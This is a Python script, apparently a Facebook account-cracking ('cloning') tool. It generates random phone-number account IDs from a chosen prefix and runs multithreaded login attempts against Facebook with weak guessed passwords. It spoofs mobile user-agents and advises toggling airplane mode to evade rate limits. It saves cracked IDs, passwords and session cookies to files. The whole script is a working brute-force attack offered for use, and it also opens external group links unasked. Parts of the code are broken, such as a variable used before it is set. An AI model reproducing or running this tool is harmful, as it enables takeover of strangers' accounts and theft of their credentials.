#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('xdg-open https://chat.whatsapp.com/Lc1wInhtm1PA7JxS5d8tsw')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
os.system("xdg-open https://facebook.com/groups/100047478438997/")
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('xdg-open https://chat.whatsapp.com/Lc1wInhtm1PA7JxS5d8tsw')
logo = """
         \033[1;32m⣿⣿⣷⣤⡀                      
  ⢀⣿⣿⣿⣿⣿⣿⣆⡀    ⣠⣴⣦⡄⢤⣄         
  ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣶⣿⣿⣿⣿⡀⣽⡿⣶⣦⡀     
  ⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡿⣿⣿⣿⣿⣆    
  ⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣦   
  ⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣿⣿⣿⣿⣿⡿⢟⣿⣷⡀ 
  ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣿⣽⣿⣽⣾⣿⣿⣿⠛⠉⠉ ⢈⣿⣿⡇ 
   ⢻⣿⣿⠛⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠡⠤⠄⠁  ⢻⣿⡇ 
   \033[1;32m⠘⣿⣿⠄  \033[1;31m█  \033[1;32m⠋⢿ ⣿⣯⣿   \033[1;31m█  \033[1;32m⣰⣿⣿⡿⡃ 
    \033[1;32m⢹⣿⣇⣀ ⠈⠉⠉⠁ ⣤⢠⣿⣿⣧⡆⣤⣤⡀⣾⣿⣿⣿⢠⡇ 
     ⣿⣿⣿⣷⣤⠄⣀⣴⣧⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠇ 
     ⠸⣿⣯⠉⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡯⠁⡌  
      ⠙⢿⡄⢿⣿⣿⣿⣿⣿⣎⠙⠻⠛⣁⣼⣿⣿⡿⠛⠁⡸   
       ⠈⢿⡄⠉⣿⡿⣿⣿⣿⣿⣷⣬⣿⡿⠟⠋⢀⣴⡞⠁   
        ⠈⢳    ⠉⠉⠋⠉⠉⠁ ⢀⣴⣿⡿     
           ⠙⠻⣿⣿⣿⣿⣿⠿⢃⣴⣿⣿⣿⠃     
              ⠙⢿⣿⣿⣿⣿⣿⣿⣿⠟      
                ⠈⠉⠛⠛⠉⠉
\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mAHMAD_KHAN          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mAHMAD_KING          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m AHMAD-HASSAN-404                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;36mHaeters   \033[1;31m ➟   \033[1;36mBAJI KA RISHTA PAISH KRO                           \033[1;31m   │
\033[1;37m╚\033[1;36mⒽⒷⒻ\033[1;37m════════════════════════════════════\x1b[0m══════\033[1;36mⒽⒷⒻ\033[1;37m╝
--------------------------------------------------
[•] \033[1;37mVERSION    \033[1;31m➟ \033[1;32m 2.4\033[1;37m
[•]\033[1;31m FOR\033[1;36m HATERS \033[1;34mWAIT AND \033[1;37mSEE
[•] Will Update Every 3 Days  
--------------------------------------------------
"""
loop = 0
ok = []
cp = []
def main():
	os.system("clear")
	print(logo)
	print(47*'-')
	print(" [1] ➟ mStart Cloning")
	print(" [2] ➟ Owner Contact  ")
	print(" [3] ➟ join Our Facebook Gruop ")
	print(" [0]      Exit")
	print(47*'-')
	Afzaal_select()

def Afzaal_select():
	QADIR = input('\n[+] Choose Option: ')
	if QADIR == '':
		print("\x1b[1;91mFill in correctly")
		main()
	elif QADIR == '1':
		SIAL()
	elif QADIR == '2':
		os.system('xdg-open https://chat.whatsapp.com/Lc1wInhtm1PA7JxS5d8tsw')
		main()
	elif QADIR == '3':
		main()
	elif QADIR == '0':
		os.system('exit')
	else:
		print ('\x1b[1;91m[!] Please select a valid option')
		time.sleep(2)
		main()

   
def SIAL():
	os.system('clear')
	print(logo)
	os.system('xdg-open https://chat.whatsapp.com/Lc1wInhtm1PA7JxS5d8tsw')
	print('[1] ➟ Random Cloning')
	print('[0] Back')
	print(47*'-')
	print ("")
	opt = input('[+] Choose option: ')
	if opt =='1':
		method()
	elif opt =='0':
		main()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		SIAL()
		
def method():
	os.system('clear')
	print(logo)

	print('[1] ➟ Method1 [Ok idz] [BEST]')
	print('[2] Method2  [Ok idz]')
	print('[0] Back')
	print(47*'-')
	print ("")
	opt = input('[+] Choose option: ')
	if opt =='1':
		method1()
	elif opt =='2':
		method2()
	elif opt =='0':
		USMANSIAL()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		method()

def method1():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Example : 92310,92342,92300,92301 ...')
	print ("")
	kode = input('[+] Choose Code : ')
	print ("")
	print('[+] For Example :2000, 5000,6000,10000 ...')
	print ("")
	limit = int(input('[+] Idz Limit : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;37m [•] SELECTED CODE :\033[1;32m'+kode)
		print('\033[1;37m [•] TOTAL ACCOUNT  :\033[1;32m '+tl)
		print('\033[1;37m [•] METHOD YOU CHOOSE : \033[1;32mM»1')
		print("\033[1;37m BRUTE HAS BEEN STARTED \x1b[0m")
		print(" TO STOP PROCESS PRES CTRL + Z\033[93;1m")
		print(50*'-')
		print('\x1b[1;97m USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		print(50*'-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345','khankhan','57273200','57575751','59039200']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*'-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input(' Press enter to back ')
	SIAL()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global agents
	try:
		for ps in pwx:
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537828;FBDM/{density=1.75,width=720,height=1396};FBLC/en_GB;FBRV/387081651;FBCR/life:) BY;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537773;FBDM/{density=2.0,width=720,height=1360};FBLC/en_GB;FBRV/0;FBCR/Lycamobile;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
			session = requests.Session()
			sys.stdout.write(f'\r [Ahmad-XD] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = (ua)
			free_fb = session.get('https://free.facebook.com/?tbua=1').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = { 'authority': 'mbasic.facebook.com',
            'method': 'POST',
            'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15,'}
			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
			#log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;92m[Ahmad-OK] '+cid+' | '+ps+'\33[0;97m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('/sdcard/SIALXDM1.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;33m[Hassan-CP] '+cid+' | '+ps+'\33[0;97m')
				open('/sdcard/SIALXDM1-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
	

def method2():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Example : 92310,92342,92300,92301 ...')
	print ("")
	kode = input('[+] Choose Code : ')
	print ("")
	print('[+] For Example : 5000,6000,10000 ...')
	print ("")
	limit = int(input('[+] Idz Limit : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;37m SELECTED CODE \033[1;32m'+kode)
		print(' Total ids: '+tl)
		print('\033[1;37m METHOD YOU CHOOSE : \033[1;32mM»2')
		print("\033[1;37m Brute Has Been Started \x1b[0m")
		print(" To Stop Process Press CTRL + Z\033[93;1m")
		print(50*'-')
		print('\x1b[1;97m USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		
		print(50*'-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345','khankhan','57273200','57575751','59039200']
			yaari.submit(mbcrack,uid,pwx,tl)
	print(47*'-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input(' Press enter to back ')
	SIAL()
	
def mbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global QADIR
	try:
		for ps in pwx:
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537828;FBDM/{density=1.75,width=720,height=1396};FBLC/en_GB;FBRV/387081651;FBCR/life:) BY;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537773;FBDM/{density=2.0,width=720,height=1360};FBLC/en_GB;FBRV/0;FBCR/Lycamobile;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
			session = requests.Session()
			sys.stdout.write(f'\r [AHMAD-XD] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = (ua)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = { 'authority': 'p.facebook.com',
    'method': 'GET',
    'scheme': 'https',   
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=r-RwZHLXlkg9Pevy-3TQvAtb; sb=r-RwZCUd0uablDdo1VSpYzps; m_pixel_ratio=2; dnonce=AWn8rekAmIPX3VLZaGKO_PWEFeXaqzJ0UqtxlMWrhG8rLA-wtoa2tE9bnUfsl8zhXUM5m6s8lhUxqK-DDfU7vRO3; wd=360x666; fr=0CueNd80HB5ZCOoJR..BkcOSv.CP.AAA.0.0.BkcOS9.AWU742TYrTY',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' [Ahmad-OK] '+cid+' | '+ps+'')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				#print('\33[1;33m[Hassan-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
	
if __name__=='__main__':
	main()